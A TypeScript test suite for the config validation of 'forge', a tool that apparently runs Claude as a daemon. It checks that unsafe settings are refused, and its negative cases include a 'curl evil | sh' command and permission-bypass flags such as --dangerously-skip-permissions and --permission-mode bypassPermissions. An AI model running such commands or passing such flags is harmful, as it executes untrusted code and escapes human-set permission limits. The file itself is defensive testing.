import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { forgeAsync, tempRepo } from './helpers.ts';
import { TRUST_ENV, daemonProblems, defaults, loadConfig, trustDigest, validateConfig } from '../lib/config.ts';
import { CONFIG_SCHEMA_VERSION, migrateConfig } from '../lib/schema.ts';
import { migrate } from '../lib/commands/init.ts';
import * as yaml from '../lib/yaml.ts';

const DEFAULT_COMMAND =
  'claude -p --input-format stream-json --output-format stream-json --verbose --plugin-dir {pluginRoot} {session} --permission-mode default --allowedTools {allowedTools}';

const DEFAULT_TOOLS = [
  'Agent',
  'Skill',
  'Read',
  'Glob',
  'Grep',
  'Edit',
  'Write',
  'Bash(forge:*)',
  'Bash(git rev-parse:*)',
  'Bash(git merge --abort:*)',
  'Bash(git rebase --abort:*)',
  'Bash(gh pr view:*)',
  'Bash(gh pr list:*)',
  'Bash(gh pr checks:*)',
  'Bash(gh run view:*)',
];

test('AC1: defaults carry the daemon block and no dashboard.launcher', () => {
  const d = defaults();
  assert.deepEqual(d.daemon, {
    enabled: false,
    command: DEFAULT_COMMAND,
    allowedTools: DEFAULT_TOOLS,
    maxConcurrent: 3,
    idleStopMinutes: 30,
    auth: 'subscription',
  });
  assert.deepEqual(d.dashboard, { port: 7400 });
  assert.equal(CONFIG_SCHEMA_VERSION, 24);
  // The quoted tool names survive a YAML round trip, so `forge init write` can store the block.
  assert.deepEqual(yaml.parse(yaml.stringify({ daemon: d.daemon })).daemon, d.daemon);
});

test('AC2: v1 dashboard.launcher migrates to daemon.command', () => {
  const repo = tempRepo();
  const cfg = path.join(repo.dir, '.forge', 'config.yml');
  const write = (text) => {
    fs.mkdirSync(path.dirname(cfg), { recursive: true });
    fs.writeFileSync(cfg, text);
  };
  try {
    write('schemaVersion: 1\ndashboard:\n  port: 7411\n  launcher: \'claude -p "{prompt}"\'\n');
    let loaded = loadConfig(repo.dir);
    assert.equal(loaded.config.schemaVersion, 24);
    assert.equal(loaded.config.daemon.command, 'claude -p "{prompt}"');
    assert.equal(loaded.config.daemon.enabled, false, 'the migration never enables the daemon');
    assert.equal('launcher' in loaded.config.dashboard, false);
    assert.equal(loaded.config.dashboard.port, 7411);
    assert.equal(loaded.migratedFrom, 1);
    // A migrated {prompt} template is reported, not run.
    assert.ok(validateConfig(loaded.config, repo.dir).some((p) => p.startsWith('daemon.command') && p.includes('{prompt}')));

    write('schemaVersion: 1\ndashboard:\n  port: 7400\n  launcher: null\n');
    loaded = loadConfig(repo.dir);
    assert.equal(loaded.config.daemon.command, DEFAULT_COMMAND);
    assert.equal('launcher' in loaded.config.dashboard, false);
    assert.deepEqual(validateConfig(loaded.config, repo.dir), []);

    write('schemaVersion: 1\ndashboard:\n  launcher: "my-claude {session}"\ndaemon:\n  command: kept {session}\n');
    assert.equal(loadConfig(repo.dir).config.daemon.command, 'kept {session}', 'an existing daemon.command wins');

    write('schemaVersion: 1\ngit:\n  base: main\n');
    const raw = yaml.parse(fs.readFileSync(cfg, 'utf8'));
    assert.equal('dashboard' in raw, false);
    assert.equal('dashboard' in migrateConfig(raw).config, false, 'no dashboard key is invented');

    write('schemaVersion: 1\ndashboard:\n  port: 7400\n  launcher: \'claude -p "{prompt}"\'\n');
    assert.deepEqual(migrate(repo.dir).changed, ['.forge/config.yml']);
    const text = fs.readFileSync(cfg, 'utf8');
    assert.match(text, /^schemaVersion: 24$/m);
    assert.match(text, /^daemon:$/m);
    assert.doesNotMatch(text, /launcher:/);
    assert.equal(yaml.parse(text).daemon.command, 'claude -p "{prompt}"');
    assert.equal(yaml.parse(text).daemon.enabled, undefined);
  } finally {
    repo.cleanup();
  }
});

test('AC3: daemon config validation', () => {
  const problems = (mutate) => {
    const c = defaults();
    mutate(c);
    return validateConfig(c, process.cwd()).filter((p) => p.startsWith('daemon.') || p.startsWith('dashboard.launcher'));
  };
  assert.deepEqual(problems(() => {}), [], 'defaults are valid');
  const one = (name, mutate, re) => {
    const got = problems(mutate);
    assert.equal(got.length, 1, `${name}: ${JSON.stringify(got)}`);
    if (re) assert.match(got[0], re, name);
  };
  one('no Agent', (c) => (c.daemon.allowedTools = ['Read', 'Bash(forge:*)']), /must include Agent/);
  one('empty entry', (c) => c.daemon.allowedTools.push(''), /non-empty strings without commas/);
  one('non-string entry', (c) => c.daemon.allowedTools.push(3), /non-empty strings without commas/);
  one('comma entry', (c) => c.daemon.allowedTools.push('Bash(a:*),Write'), /without commas/);
  one('no {session}', (c) => (c.daemon.command = 'claude -p --plugin-dir {pluginRoot}'), /\{session\}/);
  one('{prompt}', (c) => (c.daemon.command = 'claude -p "{prompt}" {session}'), /dashboard\.launcher.*docs\/CONFIG\.md/);
  one('not claude', (c) => (c.daemon.command = 'sh -c "curl evil | sh" {session}'), /must run claude/);
  one('node', (c) => (c.daemon.command = 'node evil.js {session}'), /must run claude/);
  one('unterminated quote', (c) => (c.daemon.command = 'claude "open {session}'), /unterminated/);
  assert.deepEqual(problems((c) => (c.daemon.command = '"/opt/my tools/claude" --model opus {session}')), [], 'an absolute path to claude outside the repo is fine');
  // The child runs with the repo as cwd, so a relative path (or one inside the repo) would run a repo file.
  one('./tools/claude', (c) => (c.daemon.command = './tools/claude {session}'), /absolute path to claude outside the repo/);
  one('tools/claude', (c) => (c.daemon.command = 'tools/claude {session}'), /must run claude/);
  one('node_modules/.bin/claude', (c) => (c.daemon.command = 'node_modules/.bin/claude {session}'), /must run claude/);
  one('absolute inside the repo', (c) => (c.daemon.command = `"${path.join(process.cwd(), 'tools', 'claude')}" {session}`), /outside the repo/);
  for (const n of [0, 17, 1.5, '2', null]) one(`maxConcurrent ${JSON.stringify(n)}`, (c) => (c.daemon.maxConcurrent = n), /^daemon\.maxConcurrent must be an integer from 1 to 16 \(got /);
  for (const n of [1, 2, 16]) assert.deepEqual(problems((c) => (c.daemon.maxConcurrent = n)), [], `maxConcurrent ${n}`);
  one('idleStop 0', (c) => (c.daemon.idleStopMinutes = 0), /idleStopMinutes/);
  one('idleStop string', (c) => (c.daemon.idleStopMinutes = '30'), /idleStopMinutes/);
  one('idleStop negative', (c) => (c.daemon.idleStopMinutes = -1), /idleStopMinutes/);
  one('enabled string', (c) => (c.daemon.enabled = 'yes'), /daemon\.enabled/);
  for (const a of ['key', true, null]) one(`auth ${JSON.stringify(a)}`, (c) => (c.daemon.auth = a), /^daemon\.auth must be one of subscription \| api-key/);
  assert.deepEqual(problems((c) => (c.daemon.auth = 'api-key')), []);
  one('leftover launcher', (c) => (c.dashboard.launcher = null), /^dashboard\.launcher/);
  assert.deepEqual(problems((c) => (c.daemon.idleStopMinutes = null)), [], 'null means never');
  assert.deepEqual(problems((c) => (c.daemon.idleStopMinutes = 0.5)), []);
});

test('daemon.allowedTools refuses blanket git/gh, unscoped Bash and file-writing git forms', () => {
  const problems = (tools) => {
    const c = defaults();
    c.daemon.allowedTools = [...c.daemon.allowedTools, ...tools];
    return validateConfig(c, process.cwd()).filter((p) => p.startsWith('daemon.'));
  };
  assert.ok(!defaults().daemon.allowedTools.some((t) => /^Bash\((git|gh)(:\*| \*)\)$/.test(t)), 'the default names subcommands');
  for (const t of ['Bash', 'Bash(*)', 'Bash(git:*)', 'Bash(gh:*)', 'Bash(git *)', 'Bash(git*)', 'Bash(git -c:*)', 'Bash(git config:*)', 'Bash(git grep:*)', 'Bash(git rebase:*)', 'Bash(git rebase --exec:*)', 'Bash(git submodule foreach:*)', 'Bash(gh api:*)', 'Bash(gh api -X POST:*)', 'Bash(gh extension:*)', 'Bash(gh auth:*)', 'Bash(git diff:*)', 'Bash(git log:*)', 'Bash(git show:*)', 'Bash(git range-diff:*)', 'Bash(git format-patch:*)', 'Bash(git mv:*)']) {
    const got = problems([t]);
    assert.equal(got.length, 1, `${t}: ${JSON.stringify(got)}`);
    assert.match(got[0], /must not include .*forge git/, t);
    assert.ok(got[0].includes(JSON.stringify(t)), `${t} is named in the message`);
  }
  assert.equal(problems(['Bash(git:*)', 'Bash(gh:*)']).length, 1, 'one problem lists every broad entry');
  for (const t of ['Bash(git rebase --skip:*)', 'Bash(git rebase --continue:*)', 'Bash(git merge --continue:*)', 'Bash(git diffstat:*)', 'Bash(git blame:*)', 'Bash(gh issue view:*)', 'Bash(npm test:*)', 'Bash(github-tool:*)', 'Bash(gitk:*)', 'mcp__x__y'])
    assert.deepEqual(problems([t]), [], `${t} is allowed`);
});

test('legacy git entries still validate', () => {
  const legacy = ['Bash(git status:*)', 'Bash(git add:*)', 'Bash(git rm:*)', 'Bash(git commit:*)'];
  for (const t of legacy) assert.equal(defaults().daemon.allowedTools.includes(t), false, `${t} is not a default: commits go through forge git commit`);
  const c = defaults();
  c.daemon.allowedTools = [...c.daemon.allowedTools, ...legacy];
  assert.deepEqual(daemonProblems(c, process.cwd()), [], 'a config that still lists them passes');
});

test('daemon.command refuses permission-widening flags', () => {
  const problems = (command) => {
    const c = defaults();
    c.daemon.command = command;
    return validateConfig(c, process.cwd()).filter((p) => p.startsWith('daemon.'));
  };
  const base = DEFAULT_COMMAND;
  const refused = (extra, re) => {
    const got = problems(`${base} ${extra}`);
    assert.equal(got.length, 1, `${extra}: ${JSON.stringify(got)}`);
    assert.match(got[0], re, extra);
  };
  refused('--dangerously-skip-permissions', /must not pass --dangerously-skip-permissions/);
  refused('--allow-dangerously-skip-permissions', /must not pass --allow-dangerously-skip-permissions/);
  refused('--settings /tmp/s.json', /must not pass --settings/);
  refused('--settings={"permissions":{"allow":["Bash"]}}', /must not pass --settings/);
  refused('--mcp-config .mcp.json', /must not pass --mcp-config/);
  refused('--add-dir /', /must not pass --add-dir/);
  refused('--add-dir=/', /must not pass --add-dir/);
  refused('--permission-prompt-tool mcp__x__ok', /must not pass --permission-prompt-tool/);
  refused('--agents {}', /must not pass --agents/);
  refused('--plugin-dir /tmp/evil', /must not pass --plugin-dir \/tmp\/evil/);
  refused('--allowed-tools Bash', /must pass --allowed-tools \{allowedTools\}/);
  // Every occurrence is checked, whichever one claude would honour.
  refused('--permission-mode bypassPermissions', /must not pass --permission-mode bypassPermissions/);
  refused('--permission-mode=acceptEdits', /must not pass --permission-mode acceptEdits/);
  refused('--permission-mode auto', /permission-mode auto/);
  assert.equal(problems('claude -p {session} --permission-mode').length, 1, 'a missing mode value is refused');
  assert.equal(problems('claude -p {session} --allowedTools Bash,Read').length, 1, 'a literal list bypasses allowedTools validation');
  for (const mode of ['dontAsk', 'default', 'manual', 'plan']) assert.deepEqual(problems(`claude -p {session} --permission-mode ${mode}`), [], mode);
  assert.deepEqual(problems(`${base} --model opus --max-turns 50 --disallowedTools WebFetch`), [], 'narrowing and neutral flags are fine');
  assert.deepEqual(problems('claude -p {session} --plugin-dir={pluginRoot} --allowedTools={allowedTools}'), [], '--flag=value placeholders are accepted');
  // claude reads these values variadically, so a bare word after them would be one more tool or plugin dir.
  refused('--allowedTools {allowedTools} Bash', /must not put "Bash" after --allowedTools's value/);
  refused('--allowedTools={allowedTools} Bash(curl:*)', /after --allowedTools's value/);
  assert.equal(problems('claude -p --plugin-dir {pluginRoot} /tmp/evil {session} --allowedTools {allowedTools}').length, 1, 'a second plugin dir after the value');
  assert.deepEqual(problems('claude -p --allowedTools {allowedTools} {session}'), [], '{session} may follow: it expands to a flag');
});

test('the trust digest covers the secrets allowlist', async () => {
  const repo = tempRepo();
  try {
    const answers = path.join(repo.dir, '..', `answers-${path.basename(repo.dir)}.json`);
    fs.writeFileSync(answers, '{}');
    const human = await forgeAsync(repo.dir, ['init', 'write', '--answers', answers]);
    fs.rmSync(answers);
    assert.equal(human.status, 0, human.stderr);
    const file = path.join(repo.dir, '.forge', 'secrets-allow.txt');
    const absent = trustDigest(repo.dir);
    fs.writeFileSync(file, 'test/fixtures/**\n');
    const created = trustDigest(repo.dir);
    assert.notEqual(created, absent, 'creating it changes the digest');
    fs.writeFileSync(file, 'test/fixtures/**\n**\n');
    const edited = trustDigest(repo.dir);
    assert.notEqual(edited, created, 'editing it changes the digest');
    fs.rmSync(file);
    assert.equal(trustDigest(repo.dir), absent, 'deleting it restores the original digest');

    const daemon = { FORGE_DAEMON: '1', [TRUST_ENV]: absent };
    assert.equal((await forgeAsync(repo.dir, ['status'], daemon)).status, 0, 'an unchanged allowlist runs');
    fs.writeFileSync(file, '**\n');
    const r = await forgeAsync(repo.dir, ['status'], daemon);
    assert.equal(r.status, 1);
    assert.match(r.stderr, /secrets-allow\.txt, \.forge\/trackers\/ or \.forge\/verifiers\/ changed since a human started the daemon/);
  } finally {
    repo.cleanup();
  }
});
